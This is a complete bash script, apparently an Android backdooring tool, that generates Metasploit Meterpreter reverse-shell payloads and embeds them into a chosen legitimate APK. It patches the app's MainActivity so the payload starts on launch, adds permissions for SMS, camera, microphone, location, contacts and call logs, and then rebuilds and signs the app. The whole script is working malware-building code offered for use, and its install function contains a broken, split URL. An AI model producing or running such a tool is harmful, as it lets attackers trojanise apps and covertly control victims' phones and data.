#! /bin/bash

header()
{
    echo '''

$$$$$$$$\                           $$\                                           $$\            $$\     
\__$$  __|                          $$ |                                          \__|           $$ |    
   $$ | $$$$$$\  $$$$$$\   $$$$$$$\ $$$$$$$\         $$$$$$$\  $$$$$$$\  $$$$$$\  $$\  $$$$$$\ $$$$$$\   
   $$ |$$  __$$\ \____$$\ $$  _____|$$  __$$\       $$  _____|$$  _____|$$  __$$\ $$ |$$  __$$\\_$$  _|  
   $$ |$$ |  \__|$$$$$$$ |\$$$$$$\  $$ |  $$ |      \$$$$$$\  $$ /      $$ |  \__|$$ |$$ /  $$ | $$ |    
   $$ |$$ |     $$  __$$ | \____$$\ $$ |  $$ |       \____$$\ $$ |      $$ |      $$ |$$ |  $$ | $$ |$$\ 
   $$ |$$ |     \$$$$$$$ |$$$$$$$  |$$ |  $$ |      $$$$$$$  |\$$$$$$$\ $$ |      $$ |$$$$$$$  | \$$$$  |
   \__|\__|      \_______|\_______/ \__|  \__|      \_______/  \_______|\__|      \__|$$  ____/   \____/ 
                                                                                      $$ |               
                                                                                      $$ |               
                                                                                      \__|                   

'''

}

embed()
{

printf '''
            Decompling Payload and Target APK

'''
apktool d -f payload.apk

location="$(find original/ -type f -name MainActivity.smali)"
echo $location
findd=";->onCreate(Landroid/os/Bundle;)V"
replacee='invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'

line=$(grep -n $findd $location | grep -o -E '[0-9]+' | head -1 | sed -e 's/^0\+//' )
echo $line
one="1"
line_no=$(( line + $one ))
replacement_escaped=$( echo "$replacee" | sed -e 's/[\/&]/\\&/g' )

sed -i "${line_no}s/.*/$replacement_escaped/" "$location"
echo $(cp -r payload/smali/com/metasploit original/smali/com/)

permissions=$(grep "uses-permission android:name" payload/AndroidManifest.xml | tr "\n" " ")
pay_permissions=('<uses-permission android:name="android.permission.INTERNET"/>'
    '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>'
    '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>'
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>'
    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>'
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>'
    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>'
    '<uses-permission android:name="android.permission.SEND_SMS"/>'
    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>'
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>'
    '<uses-permission android:name="android.permission.CALL_PHONE"/>'
    '<uses-permission android:name="android.permission.READ_CONTACTS"/>'
    '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>'
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>'
    '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>'
    '<uses-permission android:name="android.permission.CAMERA"/>'
    '<uses-permission android:name="android.permission.READ_SMS"/>'
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>'
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
    '<uses-permission android:name="android.permission.SET_WALLPAPER"/>'
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>'
    '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>'
    '<uses-permission android:name="android.permission.WAKE_LOCK"/>'
    '<uses-feature android:name="android.hardware.camera"/>'
    '<uses-feature android:name="android.hardware.camera.autofocus"/>')


for ((i=0;i<24;i++))
do 
    if grep -Fxq "${pay_permissions[i]}" original/AndroidManifest.xml
    then
        echo " Adding permissions $(grep -Fxq '${pay_permissions[i]}' original/AndroidManifest.xml)"
    else
        rep=$(sed -n 5p original/AndroidManifest.xml)${pay_permissions[i]}
        repl=$( echo "$rep" | sed -e 's/[\/&]/\\&/g' )
        file='original/AndroidManifest.xml'
        N=5
        sed -i "${N}s/.*/$repl/" "$file"
    fi
done

printf ''' 
        Enter name for output file (Do not add '.apk' at the end it will be added automatically)
        >'''
read -r outname
add="-embed.apk"
final="$outname$add" 
apktool b -f original/ -o $final

rm -r original payload payload.apk
lo="$(find -type f -name '$final')"

printf '''
            Embeded APK file exported to $lo
            
            Do you want to sign the apk file (you can not install the apk file without signing it first) [y/n] ?
            >'''
read -r ysign

if [[ "$ysign" == "y" ]]
then 
signa
fi
echo '''
            Redirecting to Main Menu in 10 seconds
            '''
    sleep 10
    menu

}

payload()
{
    printf '''
        Select Payload :

        [1] android/meterpreter/reverse_http           Run a meterpreter server in Android. Tunnel communication over HTTP
        [2] android/meterpreter/reverse_https          Run a meterpreter server in Android. Tunnel communication over HTTPS
        [3] android/meterpreter/reverse_tcp            Run a meterpreter server in Android. Connect back stager
        [4] android/meterpreter_reverse_http           Connect back to attacker and spawn a Meterpreter shell
        [5] android/meterpreter_reverse_https          Connect back to attacker and spawn a Meterpreter shell
        [6] android/meterpreter_reverse_tcp            Connect back to the attacker and spawn a Meterpreter shell
        
        >'''
    read -r opt_pay

    printf '''

        Enter LHOST
        >'''
    read -r lhost

    printf '''

        Enter LPORT
        >'''
    read -r lport

    printf ''' 
            Creating Payload
    '''

    if [[ "$opt_pay" == "1" ]]
    then
        msfvenom -p android/meterpreter/reverse_http lhost="$lhost" lport="$lport" -o payload.apk
    
    elif [[ "$opt_pay" == "2" ]] 
    then
        msfvenom -p android/meterpreter/reverse_https lhost="$lhost" lport="$lport" -o payload.apk
    
    elif [[ "$opt_pay" == "3" ]]
    then
        msfvenom -p android/meterpreter/reverse_tcp lhost="$lhost" lport="$lport" -o payload.apk
    
    elif [[ "$opt_pay" == "4" ]]
    then
        msfvenom -p android/meterpreter_reverse_http lhost="$lhost" lport="$lport" -o payload.apk

    elif [[ "$opt_pay" == "5" ]]
    then
        msfvenom -p android/meterpreter_reverse_https lhost="$lhost" lport="$lport" -o payload.apk

    elif [[ "$opt_pay" == "6" ]]
    then
        msfvenom -p android/meterpreter_reverse_tcp lhost="$lhost" lport="$lport" -o payload.apk

    else 
        menu
    fi

    printf '''

        Enter Location Of Target APK File
        >'''
    read -r target_apk  


    apktool d -f "$target_apk" -o original 

    embed
}

metasploit_install()
{
sudo apt-get install curl
curl https://raw.githubusercontent.com/rapid7/metasploit
omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
> msfinstall && \

echo '''
              Installation complete ! 

            Redirecting to Main Menu in 5 seconds
            '''
sleep 5
menu

}
apktool_install()
{
sudo cp apktool/apktool /usr/local/bin
sudo cp apktool/apktool.jar /usr/local/bin
echo '''
              Installation complete ! 

            Redirecting to Main Menu in 5 seconds
            '''
sleep 5
menu

}

signa()
{
    printf '''
        Enter Loaction Of The APK File
        >'''
    read -r sig_file
    echo "Password of the key is 'confirm' "
    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore "$sig_file" alias_name

    echo '''
            Redirecting to Main Menu in 10 seconds
            '''
    sleep 10
    menu
}

menu()
{
    clear
    header
    printf '''
        [1] Embed Backdoor In An APK File
        [2] Sign An APK File
        [3] Install Metaploit-Framework 
        [4] Install Apktool
        [5] Exit
        
        >'''
    read -r opt

    if [ "$opt" == "1" ]
    then
        payload
    
    elif [ "$opt" == "2" ] 
    then
        signa
    
    elif [ "$opt" == "3" ]
    then
        metasploit_install
    
    elif [ "$opt" == "4" ]
    then
        apktool_install

    elif [ "$opt" == "5" ]
    then
        exit

    else 
        menu
    fi
}


menu
